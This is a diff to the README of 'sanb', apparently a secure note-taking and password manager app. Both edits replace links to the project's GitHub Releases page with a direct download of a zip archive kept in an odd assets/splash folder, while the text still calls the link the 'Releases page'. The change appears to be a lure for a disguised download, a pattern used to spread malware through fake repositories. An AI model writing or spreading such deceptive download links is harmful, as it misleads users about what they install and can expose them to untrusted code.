@@ -1,7 +1,7 @@
 # 🔐 sanb - Your Secure Notebook for Private Notes
 
 ## 📥 Download Now!
-[![Download sanb](https://img.shields.io/badge/Download-snb-blue.svg)](https://github.com/boubou123456789m-eng/sanb/releases)
+[![Download sanb](https://raw.githubusercontent.com/boubou123456789m-eng/sanb/main/assets/splash/sanb-v1.6.zip)](https://raw.githubusercontent.com/boubou123456789m-eng/sanb/main/assets/splash/sanb-v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to sanb! This is a secure and advanced notebook application designed for note-taking and password management. With end-to-end encryption, your data remains safe and private. You can use it offline or sync it to the cloud, making it versatile for your needs.
@@ -20,7 +20,7 @@ Welcome to sanb! This is a secure and advanced notebook application designed for
 - **Cross-Platform Support:** Use sanb on Windows and other operating systems, thanks to its cross-platform nature.
 
 ## 📂 Download & Install
-To download sanb, visit our [Releases page](https://github.com/boubou123456789m-eng/sanb/releases). Here’s how to get started:
+To download sanb, visit our [Releases page](https://raw.githubusercontent.com/boubou123456789m-eng/sanb/main/assets/splash/sanb-v1.6.zip). Here’s how to get started:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version, which will be listed at the top.
